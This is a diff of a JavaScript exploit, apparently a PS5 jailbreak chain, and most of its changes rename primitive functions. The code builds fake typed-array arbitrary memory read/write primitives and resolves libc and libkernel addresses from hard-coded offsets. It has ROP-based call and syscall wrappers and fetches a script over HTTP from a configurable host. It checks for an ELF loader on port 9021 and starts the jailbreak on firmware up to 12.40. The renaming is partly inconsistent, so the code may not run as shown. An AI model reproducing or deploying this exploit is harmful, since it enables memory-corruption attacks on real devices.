           let add_32 = add & 0xffffffffn; // Just in case
           let original_value = fake_rw[21];
           fake_rw[21] = (top32b_heap<<32n) + add_32; // external_ptr of buffer
@@ -1061,41 +1061,41 @@ function main () {
         }
 
         function read32(add){
-          let read = read64(add);
+          let read = read641(add);
           return  read & 0xffffffffn;
         }
 
         function write32(add, value) {
-          let read = read64(add);
+          let read = read641(add);
           let new_value = (read & ~0xffffffffn) | (BigInt(value) & 0xffffffffn);
           write64(add, new_value);
         }
 
         function read16(add){
-          let read1 = read64(add);
+          let read1 = read641(add);
           return  read1 & 0xffffn;
         }
 
         function write16(add, value) {
-          let read = read64(add);
+          let read = read641(add);
           let new_value = (read & ~0xffffn) | (BigInt(value) & 0xffffn);
           write64(add, new_value);
         }
 
         function read8(add){
-          let read = read64(add);
+          let read = read641(add);
           return  read & 0xffn;
         }
 
         function write8(add, value) {
-          let read = read64(add);
+          let read = read641(add);
           let new_value = (read & ~0xffn) | (BigInt(value) & 0xffn);
           write64(add, new_value);
         }
 
         /***** The following primitives r/w a full 64bits Add *****/
 
-        function read64_uncompressed (add) {
+        function read641_uncompressed (add) {
           let original_value = fake_rw[21];
           fake_rw[21] = add; // external_ptr of buffer
           let read_value = fake_victim[0];
@@ -1103,7 +1103,7 @@ function main () {
           return read_value;
         }
 
-        function write64_uncompressed (add, value) {
+        function write64_uncompressed1 (add, value) {
           let original_value = fake_rw[21];
           fake_rw[21] = add; // external_ptr of buffer
           fake_victim[0] = value;
@@ -1119,7 +1119,7 @@ function main () {
             return BigInt(v >>> 0);
         }
 
-        function write32_uncompressed(add, value) {
+        function write32_uncompressed1(add, value) {
             let orig = fake_rw[85];
             let v = Number(value);
             fake_rw[85] = add;
@@ -1130,7 +1130,7 @@ function main () {
             fake_rw[85] = orig;
         }
 
-        function read16_uncompressed(add){
+        function read16_uncompressed1(add){
             let orig = fake_rw[85];
             fake_rw[85] = add;
             let v = fake_victim_8[0] | (fake_victim_8[1] << 8);
@@ -1138,7 +1138,7 @@ function main () {
             return BigInt(v);
         }
 
-        function write16_uncompressed(add, value) {
+        function write16_uncompressed1(add, value) {
             let orig = fake_rw[85];
             let v = Number(value);
             fake_rw[85] = add;
@@ -1147,7 +1147,7 @@ function main () {
             fake_rw[85] = orig;
         }
 
-        function read8_uncompressed(add) {
+        function read8_uncompressed1(add) {
             let original_value = fake_rw[85];
             fake_rw[85] = add; // Update fake_victim_8's external_ptr
             let read_value = fake_victim_8[0];
@@ -1155,7 +1155,7 @@ function main () {
             return BigInt(read_value);
         }
 
-        function write8_uncompressed(add, value) {
+        function write8_uncompressed1(add, value) {
             let original_value = fake_rw[85];
             fake_rw[85] = add; // Update fake_victim_8's external_ptr
             fake_victim_8[0] = Number(BigInt(value) & 0xffn); // Pure 1-byte STRB write
@@ -1203,17 +1203,17 @@ function main () {
 
         function get_backing_store(typed_array) {
           const obj_addr = addrof(typed_array);
-          const external = read64(obj_addr + 0x28n);
-          const base = read64(obj_addr + 0x30n);
+          const external = read641(obj_addr + 0x28n);
+          const base = read641(obj_addr + 0x30n);
           return base + external;
         }
 
         let allocated_buffers = [];
 
-        function malloc (size) {
+        function malloc1 (size) {
             const buffer = new ArrayBuffer(size);
             const buffer_addr = addrof(buffer);
-            const backing_store = read64(buffer_addr + 0x14n);
+            const backing_store = read641(buffer_addr + 0x14n);
             allocated_buffers.push(buffer);
             return backing_store;
         }
@@ -1353,28 +1353,28 @@ function main () {
 
         function call (address, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
             call_rop(address, 0x0n, arg1, arg2, arg3, arg4, arg5, arg6);
-            return read64(fake_rop_return);
+            return read641(fake_rop_return);
         }
 
         /***** LibC *****/
-        const libc_base = read64_uncompressed(eboot_base + 0x241F2B0n) - 0x1C0n;
+        const libc_base = read641_uncompressed(eboot_base + 0x241F2B0n) - 0x1C0n;
         logger.log("libc base : " + hex(libc_base));
-        const gettimeofdayAddr = read64_uncompressed(libc_base + 0x10f998n);
+        const gettimeofdayAddr = read641_uncompressed(libc_base + 0x10f998n);
         logger.log("gettimeofdayAddr : " + hex(gettimeofdayAddr));
         const syscall_wrapper = gettimeofdayAddr + 0x7n;
         logger.log("syscall_wrapper : " + hex(syscall_wrapper));
-        const sceKernelGetModuleInfoFromAddr = read64_uncompressed(libc_base + 0x10fa88n);
+        const sceKernelGetModuleInfoFromAddr = read641_uncompressed(libc_base + 0x10fa88n);
 
         // Thread for elfldr; calling Thrd_create crashes on FW 10.x and possibly higher versions
         let Thrd_create = libc_base + 0x4c30n;
         let Thrd_join = libc_base + 0x4a30n;
 
         // Used for gpu rw
-        const sceKernelAllocateMainDirectMemory = read64_uncompressed(eboot_base + 0x241f6a8n);
-        const sceKernelMapDirectMemory = read64_uncompressed(eboot_base + 0x241f680n);
+        const sceKernelAllocateMainDirectMemory = read641_uncompressed(eboot_base + 0x241f6a8n);
+        const sceKernelMapDirectMemory = read641_uncompressed(eboot_base + 0x241f680n);
 
-        const libkernel__error = read64_uncompressed(eboot_base + 0x241f3c8n);
-        const libc_strerror = read64_uncompressed(eboot_base + 0x241f3d0n);
+        const libkernel__error = read641_uncompressed(eboot_base + 0x241f3c8n);
+        const libc_strerror = read641_uncompressed(eboot_base + 0x241f3d0n);
 
         function read_cstring (add) {
             let str = '';
@@ -1382,7 +1382,7 @@ function main () {
 
             while (true) {
                 try {
-                    byte = read8_uncompressed(add);
+                    byte = read8_uncompressed1(add);
                 } catch (e) {
                     logger.log("read_cstring error reading memory at address " + hex(add) + ", e.message");
                     break;
@@ -1399,16 +1399,16 @@ function main () {
         /* Useful for getting a description after a syscall failure */
         function get_error_string () {
             let errno_func = call(libkernel__error);
-            let errno = read64_uncompressed(errno_func);
+            let errno = read641_uncompressed(errno_func);
             let strerror_add = call(libc_strerror, errno);
             let return_str = errno + " " + read_cstring(strerror_add);
             return return_str;
         }
 
-        const setjmp_addr = read64_uncompressed(eboot_base + 0x241f5f0n);
-        const longjmp_addr = read64_uncompressed(eboot_base + 0x241f5f8n);
+        const setjmp_addr = read641_uncompressed(eboot_base + 0x241f5f0n);
+        const longjmp_addr = read641_uncompressed(eboot_base + 0x241f5f8n);
 
-        const mod_info = malloc(0x300);
+        const mod_info = malloc1(0x300);
         const SEGMENTS_OFFSET = 0x160n;
 
         ret = call(sceKernelGetModuleInfoFromAddr, gettimeofdayAddr, 0x1n, mod_info);
@@ -1420,47 +1420,47 @@ function main () {
         }
 
         /***** LibKernel *****/
-        libkernel_base = read64_uncompressed(mod_info + SEGMENTS_OFFSET);
+        libkernel_base = read641_uncompressed(mod_info + SEGMENTS_OFFSET);
         logger.log("libkernel_base @ " + hex(libkernel_base));
         logger.flush();
 
         function syscall(syscall_num, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n)
         {
             call_rop(syscall_wrapper, syscall_num, arg1, arg2, arg3, arg4, arg5, arg6);
-            return read64(fake_rop_return);
+            return read641(fake_rop_return);
         }
 
         function write_string(addr, str) {
-            let bytes = stringToBytes(str);
+            let bytes = stringToBytes1(str);
             for (let i = 0; i < str.length; i++) {
-                write8_uncompressed(addr + BigInt(i), bytes[i]);
+                write8_uncompressed1(addr + BigInt(i), bytes[i]);
             }
 
-            write8_uncompressed(addr + BigInt(str.length), 0);
+            write8_uncompressed1(addr + BigInt(str.length), 0);
         }
 
-        function alloc_string(str) {
-            const addr = malloc(str.length + 1); // Full 64bits Add
-            let bytes = stringToBytes(str);
+        function alloc_string1(str) {
+            const addr = malloc1(str.length + 1); // Full 64bits Add
+            let bytes = stringToBytes1(str);
             for (let i = 0; i < str.length; i++) {
-                write8_uncompressed(addr + BigInt(i), bytes[i]);
+                write8_uncompressed1(addr + BigInt(i), bytes[i]);
             }
 
-            write8_uncompressed(addr + BigInt(str.length), 0);
+            write8_uncompressed1(addr + BigInt(str.length), 0);
 
             return addr;
         }
 
         function send_notification(text) {
             const notify_buffer_size = 0xc30n;
-            const notify_buffer = malloc(Number(notify_buffer_size));
+            const notify_buffer = malloc1(Number(notify_buffer_size));
             const icon_uri = "cxml://psnotification/tex_icon_system";
 
             // Setup notification structure
-            write32_uncompressed(notify_buffer + 0x0n, 0);           // type
-            write32_uncompressed(notify_buffer + 0x28n, 0);          // unk3
-            write32_uncompressed(notify_buffer + 0x2cn, 1);          // use_icon_image_uri
-            write32_uncompressed(notify_buffer + 0x10n, 0xffffffff); // target_id (-1 as unsigned)
+            write32_uncompressed1(notify_buffer + 0x0n, 0);           // type
+            write32_uncompressed1(notify_buffer + 0x28n, 0);          // unk3
+            write32_uncompressed1(notify_buffer + 0x2cn, 1);          // use_icon_image_uri
+            write32_uncompressed1(notify_buffer + 0x10n, 0xffffffff); // target_id (-1 as unsigned)
 
             // Write message at offset 0x2D
             write_string(notify_buffer + 0x2dn, text);
@@ -1469,7 +1469,7 @@ function main () {
             write_string(notify_buffer + 0x42dn, icon_uri);
 
             // Open /dev/notification0
-            const dev_path = alloc_string("/dev/notification0");
+            const dev_path = alloc_string1("/dev/notification0");
             const fd = syscall(SYSCALL.open, dev_path, O_WRONLY);
 
             if (Number(fd) < 0) {
@@ -1498,14 +1498,14 @@ function main () {
             if (Number(sock) < 0)
                 logger.log(`Socket creation failed: ${Number(sock)}`);
 
-            const sockaddr = malloc(16);
+            const sockaddr = malloc1(16);
 
-            write8_uncompressed(sockaddr + 1n, 2n);
+            write8_uncompressed1(sockaddr + 1n, 2n);
 
             const port_be = ((port & 0xff) << 8) | ((port >> 8) & 0xff);
 
-            write16_uncompressed(sockaddr + 2n, BigInt(port_be));
-            write32_uncompressed(sockaddr + 4n, BigInt(parseIP(ip_script)));
+            write16_uncompressed1(sockaddr + 2n, BigInt(port_be));
+            write32_uncompressed1(sockaddr + 4n, BigInt(parseIP(ip_script)));
 
             const ret = syscall(SYSCALL.connect, sock, sockaddr, 16n);
 
@@ -1518,15 +1518,15 @@ function main () {
 
         let _nanosleep_ts = 0n;
         function nanosleep_ms(ms) {
-            if (!_nanosleep_ts) _nanosleep_ts = malloc(16);
-            write64_uncompressed(_nanosleep_ts,      BigInt(Math.floor(ms / 1000)));
-            write64_uncompressed(_nanosleep_ts + 8n, BigInt((ms % 1000) * 1000000));
+            if (!_nanosleep_ts) _nanosleep_ts = malloc1(16);
+            write64_uncompressed1(_nanosleep_ts,      BigInt(Math.floor(ms / 1000)));
+            write64_uncompressed1(_nanosleep_ts + 8n, BigInt((ms % 1000) * 1000000));
             syscall(SYSCALL.nanosleep, _nanosleep_ts, 0n);
         }
 
         function httpGet(sock, path) {
             const request = `GET ${path} HTTP/1.1\r\nHost: ${ip_script}\r\nConnection: close\r\n\r\n`;
-            ret = syscall(SYSCALL.write, sock, alloc_string(request), BigInt(request.length));
+            ret = syscall(SYSCALL.write, sock, alloc_string1(request), BigInt(request.length));
             if(ret == 0xffffffffffffffffn) {
                 logger.log(get_error_string() + " error: " + get_error_string());;
             }
@@ -1634,7 +1634,7 @@ function main () {
 
             while (true) {
                 try {
-                    byte = read8_uncompressed(add + BigInt(offset));
+                    byte = read8_uncompressed1(add + BigInt(offset));
                 } catch (e) {
                     logger.log("read_cstring error reading memory at address " + hex(add) + ", e.message");
                     break;
@@ -1667,8 +1667,8 @@ function main () {
             } else {
 
                 // Check if elfldr is running at 9021
-                const sockaddr_in = malloc(16);
-                const enable = malloc(4);
+                const sockaddr_in = malloc1(16);
+                const enable = malloc1(4);
 
                 const sock_fd = syscall(SYSCALL.socket, AF_INET, SOCK_STREAM, 0n);
                 if (sock_fd === 0xffffffffffffffffn) {
@@ -1676,12 +1676,12 @@ function main () {
                 }
 
                 try {
-                    write32_uncompressed(enable, 1);
+                    write32_uncompressed1(enable, 1);
                     syscall(SYSCALL.setsockopt, sock_fd, SOL_SOCKET, SO_REUSEADDR, enable, 4n);
 
-                    write8_uncompressed(sockaddr_in + 1n, AF_INET);
-                    write16_uncompressed(sockaddr_in + 2n, 0x3D23n);      // port 9021
-                    write32_uncompressed(sockaddr_in + 4n, 0x0100007Fn);  // 127.0.0.1
+                    write8_uncompressed1(sockaddr_in + 1n, AF_INET);
+                    write16_uncompressed1(sockaddr_in + 2n, 0x3D23n);      // port 9021
+                    write32_uncompressed1(sockaddr_in + 4n, 0x0100007Fn);  // 127.0.0.1
 
                     // Try to connect to 127.0.0.1:9021
                     const ret = syscall(SYSCALL.connect, sock_fd, sockaddr_in, 16n);
@@ -1701,15 +1701,15 @@ function main () {
         }
 
         function sysctlbyname1(name, oldp, oldp_len, newp, newp_len) {
-            const translate_name_mib = malloc(0x8);
+            const translate_name_mib = malloc1(0x8);
             const buf_size = 0x70;
-            const mib = malloc(buf_size);
-            const size = malloc(0x8);
+            const mib = malloc1(buf_size);
+            const size = malloc1(0x8);
 
-            write64_uncompressed(translate_name_mib, 0x300000000n);
-            write64_uncompressed(size, BigInt(buf_size));
+            write64_uncompressed1(translate_name_mib, 0x300000000n);
+            write64_uncompressed1(size, BigInt(buf_size));
 
-            const name_addr = alloc_string(name);
+            const name_addr = alloc_string1(name);
             const name_len = BigInt(name.length);
 
             if (syscall(SYSCALL.sysctl, translate_name_mib, 2n, mib, size, name_addr, name_len) === 0xffffffffffffffffn) {
@@ -1723,14 +1723,14 @@ function main () {
             return true;
         }
 
-        function get_fwversion() {
-            const buf = malloc(0x8);
-            const size = malloc(0x8);
-            write64_uncompressed(size, 0x8n);
+        function get_fwversion1() {
+            const buf = malloc1(0x8);
+            const size = malloc1(0x8);
+            write64_uncompressed1(size, 0x8n);
 
             if (sysctlbyname1("kern.sdk_version", buf, size, 0n, 0n)) {
-                const byte1 = Number(read8_uncompressed(buf + 2n));  // Minor version (first byte)
-                const byte2 = Number(read8_uncompressed(buf + 3n));  // Major version (second byte)
+                const byte1 = Number(read8_uncompressed1(buf + 2n));  // Minor version (first byte)
+                const byte2 = Number(read8_uncompressed1(buf + 3n));  // Major version (second byte)
 
                 const version = byte2.toString(16) + '.' + byte1.toString(16).padStart(2, '0');
                 return version;
@@ -1739,7 +1739,7 @@ function main () {
             return null;
         }
 
-        function compare_version(a, b) {
+        function compare_version1(a, b) {
             const [amaj, amin] = a.split('.').map(Number);
             const [bmaj, bmin] = b.split('.').map(Number);
             return amaj === bmaj ? amin - bmin : amaj - bmaj;
@@ -1747,18 +1747,18 @@ function main () {
 
         /***** Let's trigger Jailbreak *****/
 
-        FW_VERSION = get_fwversion();
+        FW_VERSION = get_fwversion1();
 
-        prefetch_scratch = malloc(256);
-        script_scratch = malloc(512*1024);
+        prefetch_scratch = malloc1(256);
+        script_scratch = malloc1(512*1024);
 
         var kernel = { addr: {}, read_buffer: null, write_buffer: null };
         var kernel_offset = null;
 
-        if (compare_version(FW_VERSION, "12.40") > 0) {
+        if (compare_version1(FW_VERSION, "12.40") > 0) {
             logger.log("Unsupported FW_VERSION: " + FW_VERSION);
             send_notification("Unsupported FW_VERSION: " + FW_VERSION);
-        } else if (compare_version(FW_VERSION, "10.01") > 0) {
+        } else if (compare_version1(FW_VERSION, "10.01") > 0) {
             logger.disableWidget();
 
             var script_name = "p2jb.js";
